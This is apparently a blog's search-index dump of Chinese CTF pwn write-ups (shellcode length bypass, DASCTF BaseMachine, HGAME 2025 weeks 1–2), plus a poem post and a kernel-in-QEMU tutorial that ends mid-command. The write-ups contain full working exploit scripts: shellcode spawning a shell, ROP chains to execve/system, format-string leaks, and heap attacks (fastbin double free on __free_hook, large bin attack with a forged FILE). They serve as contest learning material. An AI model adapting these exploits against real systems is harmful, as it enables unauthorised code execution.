[{"title":"shellcode - 有长度限制的 shellcode 解法","url":"/categories/CTF/241103-shellcode/","content":"shellcode\n\nshellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16\n进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode\n常常使用机器语言编写。 \n\n程序分析\n题目来源：第七届浙江省大学生网络与信息安全竞赛预赛\n\n\nimage-20241103161301251\n\nchecksec\n\n\n保护全开\n\n逆向分析\n\n\nIDA 伪代码\n\n程序的功能很直接，执行输入的一段 shellcode，但是有\n0xa 的长度限制。\n并且存在 memmem 函数，检查输入的内容，使用 IDA 继续查看\nunk_203D 的内容，发现是出题人禁止了 syscall\n的机器码。\n\n\nsyscall('0f')\n\n动态调试\n\n在程序执行 shellcode 之后，观察寄存器和栈的情况。当时比赛时发现\nr8 中存有 syscall\n指令的地址，我的一个想法是控制寄存器 rax, rdi,\nrsi, rdx 执行系统调用 read。\nmov rsi,rax\nxor rax,rax\nxor rdi,rdi\nadd rdx,0x50\ncall r8\n不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用\nr8 跳转到某个 main 函数上的指令，调试发现从\nr8 到一个 main\n函数的地址需要减去三位十六进制数，也就是说操作数占据了 shellcode 中 0x4\n的长度了。哎，结果我就这样忽视了 rsp 上的\n&lt;main+0132&gt;，一直到比赛结束。\n攻击流程\n这里的思路是白夜学长提供的。\n调整传参寄存器，控制程序流程\nELF 中的 read 函数参数如下\n\n栈中的数据如下\n\n\n由于程序中使用 call\nrax 执行 shellcode，返回地址存在栈顶\n\n第一段 shellcode\npop rdx; 返回地址出栈\npop rdi; fd\npop rsi; 将不需要的数据出栈\npop rsi; *buf &lt;- shellcode address\nsud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;\ncall rdx\n将程序跳转到 main 函数的 call _read 前:\n\n执行 shellcode\n没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。\nExploit\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\np = process(\"./shellcode1\")\n#p = remote(\"139.155.126.78\", \"38681\")\nshellcode = \"\"\"\npop rdx;\npop rdi;\npop rsi;\npop rsi;\nsub rdx, 0x41;\ncall rdx;\n\"\"\"\ngdb.attach(p)\np.sendafter(b\"input\", asm(shellcode))\nshellcode = \"\"\"\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\n\"\"\" #10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)\nshellcode += shellcraft.sh()\np.send(asm(shellcode))\np.interactive()\n小结\n这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。\n","categories":["CTF"],"tags":["pwn","shellcode"]},{"title":"钱塘江边","url":"/categories/%E6%97%A5%E5%B8%B8/20241106-daily/","content":"\n一叶舟轻，双桨鸿惊。水天清、影湛波平。鱼翻藻鉴，鹭点烟汀。过沙溪急，霜溪冷，月溪明。\n重重似画，曲曲如屏。算当年，虚老严陵。君臣一梦，今古空名。但远山长，云山乱，晓山青。\n——《行香子・过七里濑》 \n\n\n\n摄于 2024/11/5 17:18 沿江大道\n","categories":["日常"]},{"title":"DASCTF12 月赛复现","url":"/categories/CTF/dasctf2025-12-wp/","content":"前言\n本次 DASCTF\n12 月赛尝试了 pwn 方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。\n\nBaseMachine\nchecksec\n\n\n保护全开\n\n逆向分析\n\n\nmain\n\n读入 ./flag 后传入\nsub_3990，图中的乱码是表情，是 IDA 的编码问题。后面是循环读入用户输入，同样传入\nsub_3990。\n进入 sub_3990 继续分析：\n\n\nv9\n\n根据传入的参数 a1, a2\n决定程序后续流程，具体是编码类型 (base64, base85...)。\n有意思的是，程序将字符串的加解密流程放在在 _data\n，即数据段中。\nv10 = ((__int64 (__fastcall *)(char *, const char *))*(&amp;off_7260 + v8))(s, a3);\n.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155↑o\n.data:0000000000007260                                         ; sub_3990+1C8↑o\n.data:0000000000007268                 dq offset sub_1ED6\n.data:0000000000007270                 dq offset sub_22B2\n.data:0000000000007278                 dq offset sub_27D4\n.data:0000000000007280                 dq offset sub_2B94\n.data:0000000000007288                 dq offset sub_2E17\n.data:0000000000007290                 dq offset sub_3498\n.data:0000000000007290 _data           ends\n.data:0000000000007290\n这涉及到 C 语言中函数指针的概念:\n函数指针是一个指向函数的指针变量，如：\nint (*p)(int x, int  y);\n具有两个整型参数，返回值是整型。\n如下代码实现了通过函数指针调用函数：\nint maxValue (int a, int b) {\n    return a &gt; b ? a : b;\n}\n\nint (*p)(int, int) = NULL;\np = maxValue;\np(1, 2);\n而题目程序中就是通过类似这样的函数指针数组实现的。\n接着，根据与 unk_73C0 中的数据比较这一功能可以（应该？）推测是在计算哈希\n\n\nwp 中指出这是在计算 SHA256\n\n如果没有找到相同的，就使用新的槽位：\n\n\n选择最先或未使用的槽位，覆盖该槽位存储的数据\n\n存、读取哈希和密文部分：\n\n解密、输出部分：\n\n\n是否输出由传入参数 a4 决定\n\nVulnerabilities\n与 unk_73C0 读写有关的函数 sub_37A4\n中存在溢出漏洞\n\n\n数组只能储存 0-5\n\n\n\nunk_73c0 将编码类型和明文写入对应位置\n\n攻击流程\n以下为官方 wp 思路。\n寻找具有 'b85' 开头 SHA256 值的字符串，将 flag 槽位上的哈希修改为这个值。具体实现如下（来自官方 wp）：\n#!/usr/bin/env python3\nfrom pwncli import *\n\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"122\"]\nlocal_flag = sys.argv[1] if len(sys.argv) == 2 else 0\n\nif local_flag == \"remote\":\n    addr = ''\n    host = addr.split(' ')\n    gift.io = remote(host[0], host[1])\n    gift.remote = True\nelse:\n    gift.io = process('./BaseMachine')\n    if local_flag == \"nodbg\":\n        gift.remote = True\ninit_x64_context(gift.io, gift)\nlibc = load_libc()\ngift.elf = ELF('./BaseMachine')\ncmd = '''\n    c\n'''\n\n\nfor i in range(3):\n    sla(\"🫠🫠🫠\", 'plain b64 ' + str(i))\n\nlaunch_gdb(cmd)\nsla(\"🫠🫠🫠\", b'plain b85 ' + b'aaaa' * 10 + b'a')\nru(\"😍😍😍 \")\ndata = ru(b'\\n', drop=True)\npad1 = data[0:5]\npad2 = data[-5:]\n\n# Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888\n\nfor i in range(1, 8):\n    sla(\"🫠🫠🫠\", b'b85 plain ' + b'09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa' + pad1 * i + pad2 + pad1 * (10 - i))\n\nsla(\"🫠🫠🫠\", b'plain b64 6eU')\nru(\"😍😍😍 \")\nflag = ru(b'\\n', drop=True)\nsla(\"🫠🫠🫠\", b'b64 plain ' + flag)\n\nia()\n总结\n这题的作者可见对编码非常熟悉，目前我还没有对 base 系列有一个太清晰的了解。最多知道它大概的原理，或者仿写加解密的代码之类的。以后有空我会尝试手搓一下各种 base 的加解密的（之前接触 base 是 hgame-mini\n2024 上的一道逆向题 ——base emoji）。另外对代码的阅读能力也有待提升。\n","categories":["CTF"],"tags":["pwn","代码审计","函数指针"]},{"title":"HGAME 2025 Week 1 Writeup","url":"/categories/CTF/hgame-2025-week1-wp/","content":"counting petals\nVulnerabilities\n\n存在越界写入漏洞。 \n\n存在任意读漏洞。\n\nExploit\n观察栈结构，构造数据使 v9=16 时令 v8,\nv9 为不合法的值，从而泄露栈上的 libc 地址。\n第二次循环时利用任意写，构造 ROP 链。\nfrom pwn import *\ncontext.log_level = \"debug\"\np = remote(\"node2.hgame.vidar.club\",32442)\nlibc = ELF(\"./libc.so.6\")\ne = ELF(\"./vuln\")\npop_rdi_off = 0x2a3e5\npop_rsi_off = 0x2be51\npop_rdx_r12_off= 0x11f2e7\np.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")\nfor i in range(15):\n    p.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(0x1400000013))\np.sendlineafter(\"latter:\",str(1))\np.recvuntil(b\"+ 1 + \")\nnumber = p.recvuntil(b\" +\", drop=True)\nnumber = number.decode().strip()\nlibc_address = int(number)\nlog.info(hex(libc_address))\nlibc_base = libc_address - 0x29D90\nlog.info(hex(libc_base))\nsys_addr = libc_base + libc.sym[\"execve\"]\nbinsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))\npop_rdi = libc_base + pop_rdi_off\npop_rsi = libc_base + pop_rsi_off\npop_rdx_r12 = libc_base + pop_rdx_r12_off\np.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")\npause()\nfor i in range(15):\n    p.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(0x120000001a))\np.sendlineafter(\"the flower number\",str(pop_rdi)) \np.sendlineafter(\"the flower number\",str(binsh_addr))\np.sendlineafter(\"the flower number\",str(pop_rsi))\np.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(pop_rdx_r12))\np.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(binsh_addr))\np.sendlineafter(\"the flower number\",str(sys_addr)) \np.sendlineafter(\"latter:\",str(1))\np.interactive()\nezstack\n根据题目所给的 Dockerfile 获取远程环境相应的 libc:\ndocker build -t pwn:v1 .\n\n禁用 execve\nVulnerabilities\n\n存在栈溢出漏洞。\n\n可以修改 rbp 进行栈迁移。\n\n有大段的可写可读段。\nExploit\n栈迁移到恰当位置，令 fd=4\n泄露 libc 地址，并调整程序读入的长度，方便后续存放 ROP 链。\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",32351)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc-2.31.so\")\nwrite_plt = e.plt['write']\nwrite_got = e.got['write']\nwritable_addr = 0x404154\nread_ret = 0x40140f\npop_rdi = 0x401713\npop_rsi_r15 = 0x401711\nleave_ret = 0x401425\nprint(\"plt:\",hex(write_plt))\nprint(\"got:\",hex(write_got))\npause()\npayload = b'a' * 80 + p64(writable_addr) + p64(read_ret)\np.sendafter(\"Good luck.\",payload)\npause()\npayload = flat({\n    0x00: [\n        p64(writable_addr),\n        p64(pop_rdi),\n        p64(0x4),\n        p64(pop_rsi_r15),\n        p64(write_got),p64(0),\n        p64(write_plt), #write(4,&lt;write@got&gt;)\n        p64(read_ret),\n        p64(leave_ret),\n    ],\n    0x50: [\n        p64(writable_addr-0x50),\n        p64(leave_ret),\n    ]\n})\np.send(payload)\nwrite_address = u64(p.recvuntil('\\x00\\x00',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = write_address - 0x10e280\nlog.info(hex(libc_base))\npop_rdx_r12 = libc_base + 0x119431\npop_rsi = libc_base + 0x2601f\n_read= libc_base + libc.symbols[\"read\"]\n_open= libc_base + libc.symbols[\"open\"]\n_write= libc_base + libc.symbols[\"write\"]\npayload = flat({\n    0x00: [\n        p64(0x404154+0xd0),\n        p64(pop_rsi),\n        p64(0x404154),\n        p64(pop_rdx_r12),\n        p64(0x200),p64(0), \n        p64(_read),# read(4,buf,0x200)\n        p64(leave_ret),\n        p64(leave_ret),\n    ],\n    0x50: [\n        p64(writable_addr-0x50),\n        p64(leave_ret),\n    ]\n})\npause()\np.send(payload)\npayload = flat({\n    0x00: [\n        p64(0xc0ffee),\n        p64(pop_rdi),\n        p64(0x404154+0xe0),\n        p64(pop_rsi),\n        p64(0),\n        p64(pop_rdx_r12),\n        p64(0),p64(0),\n        p64(_open), # open(./flag,0,0)\n        p64(pop_rdi),\n        p64(0x5),\n        p64(pop_rsi),\n        p64(0x404154+0xe0),\n        p64(pop_rdx_r12),\n        p64(0x100),p64(0),\n        p64(_read), #read(5,buf,0x100)\n        p64(pop_rdi),\n        p64(0x4),\n        p64(pop_rsi),\n        p64(0x404154+0xe0),\n        p64(pop_rdx_r12),\n        p64(0x30),p64(0),\n        p64(_write), #write(4,buf,0x20)\n    ],\n    0xd0: [\n        p64(0x404154),\n        p64(leave_ret),\n    ],\n    0xe0: [\n        b'./flag\\x00',\n    ]\n})\npause()\np.send(payload)\np.interactive()\nformat\nVulnerabilities\n\n格式化字符串漏洞。\n\n\n整型判断，使用无符号整型传入。输入一个负数即可绕过输入长度的限制。\n\n可以栈迁移。\nExploit\n使用 %p 泄露栈的地址，在 vuln\n函数的栈帧内写入更长的格式化字符串，然后控制 rbp\n到合适位置，溢出覆盖返回地址为格式化漏洞处，泄露 libc 地址，再次进入\nvuln 构造 ROP 链。\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",30762)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc.so.6\")\nleave_ret = 0x4011ee\nmain = 0x4011f0\np.sendlineafter(\"you have n chance to getshell\",str(1))\np.sendlineafter(\"type something:\",\"%p\")\np.recvuntil(b\"you type: 0x\")\nstack_addr = p.recvuntil(b\"you have\", drop=True)\nstack_addr = int(stack_addr,16)\nlog.info(hex(stack_addr))\nrbp = stack_addr + 0x211c\np.sendafter(\"n = \",\"-1\\x00\")\npause()\npayload = flat({\n    0x00: [\n        b'%9$p',\n        p64(rbp),\n        p64(0x4012cf),\n    ]\n})\np.sendafter(\"type something:\",payload)\np.recvuntil(b\"0x\",drop=True)\nlibc_addr = p.recv(12)\nlibc_addr = int(libc_addr,16)\nlibc_base = libc_addr - 0x29d90\nlog.info(hex(libc_base))\n\nbinsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))\nsys_addr = libc_base + libc.sym[\"system\"]\npop_rdi = libc_base + 0x2a3e5\npayload = flat({\n    0x0c: [\n        p64(0x40101a),\n        p64(pop_rdi),\n        p64(binsh_addr),\n        p64(sys_addr)\n    ]\n})\np.sendafter(\"type something:\",payload)\np.interactive()\nCompress dot new\n题目给出 Nushell 编写的 Huffman 编码，解码代码如下\ndef \"decode\" [tree encoded] {\n    let bits = ($encoded | split chars)\n    mut result = []\n    mut current_node = $tree\n    for bit in $bits {\n        $current_node = if $bit == '0' {\n            $current_node.a\n        } else { $current_node.b }\n        if 's' in $current_node {\n            $result ++= [$current_node.s]\n            $current_node = $tree\n        }\n    }\n    if 's' in $current_node {\n        $result ++= [$current_node.s]\n    }\n    $result | each { into binary } | bytes collect\n}\n\ndef \"decompress\" [] {\n    let input = (open ./enc.txt --raw | split row \"\\n\")\n    let tree = $input.0 | from json\n    let encoded_str = $input.1\n    decode $tree $encoded_str\n}\n\ndecompress | save ./flag.txt --force\n部分内容参考 DeepSeek R1 生成\nTurtle\n\nDIE 检测存在 upx 壳，使用 x64dbg 定位程序入口点后 dump 脱壳。\n程序使用两次 RC4\n加密，依该加密算法的对称性质，第一次加密函数处传入密文得到 key。\n第二次加密函数处将 -= patch 为\n+=，传入密文得到 flag。\n\n","categories":["CTF"],"tags":["pwn","re","hgame"]},{"title":"HGAME 2025 Week 2 Writeup","url":"/categories/CTF/hgame-2025-week2-wp/","content":"Signin2Heap\nVulnerabilities\n\n存在 off-by-null 漏洞，当 prev_size 域复用时，可置零相邻\nchunk 的 prev_inuse 位。\n\n\n只能申请至多 0xFF 大小的堆块，考虑 fastbin attack。\nExploit\n由于程序没有编辑功能，只能使用 add 功能修改堆数据。布置大小分别为\n0xf0, 0x68, 0xf0\n的三个堆块，然后将 0xf0 大小的 tcache bin\n填满。此时释放 chunk 0，将进入 unsorted bin\n。为了泄露出 libc 有关地址，我们需要利用 show 功能输出 freed chunk\n上的指针 (即 fd )。通过如下操作可以实现类似 UAF 的效果：\n\n修改 chunk 2 的 prev_size 和 prev_inuse\n；\n释放 chunk 2，引起向后合并，此时堆管理器认为 chunk 0 ~ chunk 2\n都已经为空闲状态，放入 unsorted bin ；\n先清空优先级更高的 tcache bin ，然后申请 chunk 0\n大小的堆，从 unsorted bin 中取，此时 fd 移动到 chunk 0\n的后面。\n\n经过以上操作后，chunk 1 的位置恰好是 unsorted bin\n的头部。但同时程序逻辑上 chunk 1 并没有被释放，引起了 UAF，double\nfree。\n再次填满 tcache bin ，利用 fastbin double free\n可实现任意写。\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",32253)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc-2.27.so\")\ndef add(index,size,content):\n    p.sendafter(\"Your choice:\",b\"\\x01\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size: \",str(size))\n    p.sendafter(\"Content: \",content)\ndef show(index):\n    p.sendafter(\"Your choice:\",b\"\\x03\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\ndef dele(index):\n    p.sendafter(\"Your choice:\",b\"\\x02\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\nadd(0,0xf0,'a')\nadd(1,0x68,'a')\nadd(2,0xf0,'b')\nfor i in range(3,10):\n  add(i,0xf0,'a')\nfor i in range(3,10): #fill tcache\n   dele(i)\ndele(0)\ndele(1)\nadd(1,0x68,b'a'*0x60+p64(0x170))\ndele(2)\nfor i in range(3,10):\n  add(i,0xf0,'a')\nadd(0,0xf0,'a')\nshow(1)\nmain_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = main_arena - 0x3ebca0\nlog.info(hex(libc_base))\nfree_hook = libc_base + libc.symbols['__free_hook']\none_gadget = libc_base + 0x4f302\nadd(11,0x30,'a')\nadd(12,0x30,'a')\nfor i in range(3,10):\n    dele(i)\nfor i in range(3,10):\n    add(i,0x30,'a')\nfor i in range(3,10): #fill tcache\n    dele(i)\ndele(11)\ndele(12) #a padding chunk\ndele(1) #fastbin double free\nfor i in range(3,10):\n    add(i,0x30,'a') #clear tcache\nadd(1,0x30,p64(free_hook))\nadd(12,0x30,'qaq')\nadd(11,0x30,'qaq') #clear padding chunk\nadd(13,0x30,p64(one_gadget)) #a chunk at &lt;__free_hook&gt;\ndele(0)\np.interactive()\nWhere is the vulnerability\n\n第一次打这么高版本的\nlibc（原谅我当时脑抽看成 2.29，一堆老漏洞用了半天发现不行 hhh）\n\n禁用 execve\nVulnerabilities\n\n明显的 UAF 漏洞。\n\n只能申请 0x500 ~ 0x900 大小的堆，考虑 large bin\nattack。\nExploit\n堆块大小限制导致我们只能使用 unsorted bin 和\nlarge bin，即使通过 UAF 漏洞可以修改堆上的\nsize 从而使其进入 tcache bin\n，但是不能重新申请进行利用。\n显而易见的，可以利用 unsorted bin 的特性快速得到 libc\n基址。\n同时，布置后续的堆块，以进行 large bin attack。\nlarge bin attack 的操作简要描述如下，当然在 how2heap\n中有更好更详细的描述：\n\n申请两个\nchunk，且大小不相同，并在其之后都申请任意大小的堆块，防止释放后合并；\n释放 chunk 0；\n申请一个大于 chunk 0 大小的堆，chunk 0 将进入\nlarge bin；\n释放 chunk 2；\n修改 chunk 0 的 bk_nextsize 为\ntarget - 0x20{sizeof(prev_size + fd + bk + fd_nextsize)}\n。\n重复第三步，chunk 2 将进入 large bin ，由于 chunk 2\n更小，导致操作\nbk_nextsize-&gt;fd_nextsize = &amp;chunk2。\n\n此时就在目标位置写入了 chunk 2 的 prev_size 地址。\n通过一种叫做 House of apple\n的方式，就可以攻击 IO，劫持程序执行流。\n在泄露出 libc 地址后，进而得到 IO_list_all 的地址，利用\nlarge bin attack 将 chunk 地址写入，之后在 chunk 2 上伪造 FILE\n结构体。\n原理部分请自行查找（毕竟我还没完全弄明白）。我们主要关注伪造 IO 的最后一行，它可以让我们跳转到一个地址，即控制一次\n$RIP 。我们的目的是找到一个\ngadget，帮助我们实现栈迁移，执行 ROP 链。\n可以利用的 gadget 如下：\n\n\ngadget 1\n\n动态调试可以发现 $rax 指向 fake_io\n有关地址，因此可以改变 $rdx 的值。\n将 $rdx 改为一处可读写段，执行下一段 gadget：\n\n\ngadget 2.1\n\n\n\ngadget 2.2\n\n修改 $rsp 实现栈迁移，注意在后面会将\n$rcx=[rdx+0xa8]\n入栈，改为一个对后续无影响的可执行地址即可，或者 ROP 的第一个地址。\n最后进入 exit() 触发相关调用链，执行\norw（如此有仪式感的操作自然是手动完成）。\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",31067)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc.so.6\")\n\n\ndef add(index,size):\n    p.sendlineafter(\"5. Exit\",b\"1\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size: \",str(size))\ndef show(index):\n    p.sendlineafter(\"5. Exit\",b\"4\")\n    p.sendlineafter(\"Index:\",str(index))\ndef dele(index):\n    p.sendlineafter(\"5. Exit\",b\"2\")\n    p.sendlineafter(\"Index:\",str(index))\ndef edit(index,content):\n    p.sendlineafter(\"5. Exit\",b\"3\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendafter(\"Content: \",content)\n    \n    \nadd(0,0x528)\nadd(1,0x508) #prevent consolidating\nadd(2,0x518)\nadd(3,0x721)\ndele(0)\nshow(0)\n\n\nmain_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = main_arena - 0x203b20\nIO_list_all=libc_base+libc.symbols['_IO_list_all']\n_IO_stdfile_2_lock=libc_base+0x205700\n\n_open=libc_base+libc.sym['open']\n_read=libc_base+libc.sym['read']\n_write=libc_base+libc.sym['write']\n\npop_rdi = libc_base + 0x10f75b\npop_rsi = libc_base + 0x110a4d\npop_rdx = libc_base + 0x66b9a #pop rdx ; ret 0x19\n\ngadget = libc_base + 0x176f0e\nsetcontext = libc_base + 0x4a98d\nret = libc_base + 0x2882f\nlog.info(hex(libc_base))\n\n\nadd(4,0x558)\ndele(2)\nshow(0)\nchunk_fd = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nedit(0,b'a'*16)\nshow(0)\nfd_nextsize = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nheap_base = fd_nextsize + 0x10\nlog.info(hex(heap_base))\n\n\nedit(0,p64(chunk_fd)*2+p64(fd_nextsize)+p64(IO_list_all-0x20))\nadd(5,0x558) #large bin attack: write chunk address at target\n\n\norw_addr = heap_base + 0x1bf0\nfile_addr = heap_base + 0xa30\nIO_wide_data_addr=file_addr\nwide_vtable_addr=file_addr+0xe8-0x68\n\nfake_io = b\"\"\nfake_io += p64(0)  # _IO_read_end\nfake_io += p64(0)  # _IO_read_base\nfake_io += p64(0)  # _IO_write_base\nfake_io += p64(1)  # _IO_write_ptr\nfake_io += p64(0)  # _IO_write_end\nfake_io += p64(0)  # _IO_buf_base;\nfake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)\nfake_io += p64(0)  # _IO_save_base\nfake_io += p64(0)*3  # from _IO_backup_base to _markers\nfake_io += p64(0)  # the FILE chain ptr\nfake_io += p32(2)  # _fileno for stderr is 2\nfake_io += p32(0)  # _flags2, usually 0\nfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1\nfake_io += p16(0)  # _cur_column\nfake_io += b\"\\x00\"  # _vtable_offset\nfake_io += b\"\\n\"  # _shortbuf[1]\nfake_io += p32(0)  # padding\nfake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock\nfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1\nfake_io += p64(0)  # _codecvt, usually 0\nfake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1\nfake_io += p64(0) * 2  # from _freeres_list to __pad5\nfake_io += p64(orw_addr+0x100) #rdx value(__pad5)\nfake_io += p32(0xFFFFFFFF)  # _mode, usually -1\nfake_io += b\"\\x00\" * 19  # _unused2\nfake_io = fake_io.ljust(0xc8, b'\\x00')  # adjust to vtable\nfake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtable\nfake_io += p64(wide_vtable_addr)\nfake_io += p64(gadget) #set rdx\nedit(2,fake_io)\n\norw_payload = flat({\n    0x00: [\n        p64(pop_rdi),\n        p64(orw_addr+0x128),\n        p64(pop_rsi),\n        p64(0),\n        p64(pop_rdx),\n        p64(0),\n        p64(_open), # open(./flag,0,0)\n        b'a'*0x19, # padding\n        p64(pop_rdi),\n        p64(3),\n        p64(pop_rsi),\n        p64(orw_addr+0x200),\n        p64(pop_rdx),\n        p64(0x30),\n        p64(_read), # read(3,buf,0x30)\n        b'a'*0x19,\n        p64(pop_rdi),\n        p64(1),\n        p64(pop_rsi),\n        p64(orw_addr+0x200),\n        p64(pop_rdx),\n        p64(0x30),\n        p64(_write), # write(1,buf,0x30)\n        b'a'*0x19,\n    ],\n    0x120: [\n        p64(setcontext),\n        b'./flag\\x00\\x00',\n    ],\n    0x1a0: [\n        p64(orw_addr), #rsp value\n        p64(ret),\n    ]\n})\nedit(5,orw_payload)\nedit(1,b'a'*0x500+b' sh;') #reserved for debug, [$rdi]\n\n\np.interactive()\nHit list\n很遗憾本题没有解出，因为前面较少接触的堆题耗费了我挺多心力的，到这已经没什么精力去做了。不过收获很多，是大于遗憾的。\n明年见！\n平台很好看，出题人很热心，题目很难（\nhgame{see_you_next_year!!!}\n","categories":["CTF"],"tags":["pwn","hgame"]},{"title":"Linux Kernel: build, boot and debug in QEMU","url":"/categories/Study/kernel-build/","content":"一次内核编译到运行的尝试\n编译内核\n拉取源码\n$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n\n调整配置\n为了让 gdb 可以调试内核并加载符号，需要更改一些编译选项.\n$ make menuconfig\nKernel hacking  ---&gt;\n\t[*] Kernel debugging\n\tCompile-time checks and compiler options  ---&gt;\n\t\tDebug information (Rely on the toolchain's implicit default DWARF version)\n\t\t[*] Provide GDB scripts for kernel debugging\n编译\n$ make -j$(nproc)\n$ make bzImage\n内核启动流程\n我们并不需要弄清楚启动过程的所有细节，\n这里只简略介绍以便于解释后文的操作\nKernel Initialization\n这个阶段内核会将映像自解压到内存中，并且进行硬件相关的初始化，\n设置中断处理 (interrupt handling)、内存管理 (memory management),\n挂载根文件系统 (/) 或者初始 RAM 磁盘 (initrd), 加载驱动.\nInit process\n内核初始化后，就会准备我们所熟悉的用户空间 (Userspace) 的初始化.\n事实上内核会执行 /sbin/init, /etc/init 或\ninitramfs/initrd 中指定的第一个用户空间程序 (通常是 Systemd、SysVinit 或\nOpenRC), 作为用户空间中的第一个进程 (PID=1),\n当然它可以是任何可执行的文件，包括 shell script.\n使用 QEMU 运行内核\n构建 rootfs\n根文件系统遵循 https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard,\n这里使用 Arch Linux 的 pacstrap 来构建一个较简单的 rootfs:\n#!/bin/bash\n\nset -e\n\nROOTFS_DIR=\"test_kernel/arch_full_rootfs\"\n\nif [ -d \"$ROOTFS_DIR\" ]; then\n    sudo rm -rf \"$ROOTFS_DIR\"\nfi\n\nmkdir -p \"$ROOTFS_DIR\"\n\nsudo pacstrap -K -c \"$ROOTFS_DIR\" \\\n    base \\\n    linux-firmware \\\n    bash \\\n    coreutils \\\n    util-linux \\\n    procps-ng \\\n    iproute2 \\\n    iputils \\\n    net-tools \\\n    vim \\\n    nano \\\n    less \\\n    grep \\\n    sed \\\n    gawk \\\n    tar \\\n    gzip \\\n    which \\\n    man-db \\\n    man-pages\n\nsudo arch-chroot \"$ROOTFS_DIR\" passwd -d root\n\nsudo tee \"$ROOTFS_DIR/init\" &gt; /dev/null &lt;&lt; 'EOF'\n#!/bin/bash\n\nmount -t proc proc /proc\nmount -t sysfs sys /sys\nmount -t devtmpfs dev /dev\nmount -t tmpfs tmp /tmp\nmkdir -p /dev/pts /dev/shm\nmount -t devpts devpts /dev/pts\nmount -t tmpfs shm /dev/shm\n\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nexport HOME=/root\nexport TERM=linux\n\nif [ -x /usr/lib/systemd/systemd-udevd ]; then\n    /usr/lib/systemd/systemd-udevd --daemon 2&gt;/dev/null\n    udevadm trigger --action=add 2&gt;/dev/null\n    udevadm settle 2&gt;/dev/null\nfi\n\nclear\n\nexec /bin/bash --login\nEOF\n\nsudo chmod +x \"$ROOTFS_DIR/init\"\n\nsudo mkdir -p \"$ROOTFS_DIR\"/{dev,proc,sys,run,tmp}\n然后使用如下脚本将其打包为 ext4 image:\n#!/bin/bash\n\nset -e\n\nROOTFS_DIR=\"test_kernel/arch_full_rootfs\"\nIMAGE_FILE=\"test_kernel/arch_full.ext4\"\nIMAGE_SIZE=\"4G\"  \n\nif [ ! -d \"$ROOTFS_DIR\" ]; then\n    exit 1\nfi\n\nif [ -f \"$IMAGE_FILE\" ]; then\n    rm -f \"$IMAGE_FILE\"\nfi\n\ndd if=/dev/zero of=\"$IMAGE_FILE\" bs=1M count=0 seek=$(echo $IMAGE_SIZE | sed 's/G/*1024/;s/M//;' | bc) status=progress\n\nmkfs.ext4 -F -L \"arch-rootfs\" \"$IMAGE_FILE\"\n\nMOUNT_POINT=$(mktemp -d)\nsudo mount -o loop \"$IMAGE_FILE\" \"$MOUNT_POINT\"\n\nsudo cp -a \"$ROOTFS_DIR/\"* \"$MOUNT_POINT/\"\n\nsync\nsudo umount \"$MOUNT_POINT\"\nrmdir \"$MOUNT_POINT\"\n\nsudo chown $USER:$USER \"$IMAGE_FILE\"\n我们尝试使用如下参数运行 QEMU\n$ KERNEL=\"arch/x86/boot/bzImage\"\n$ ROOTFS=\"test_kernel/arch_full.ext4\"\n$ 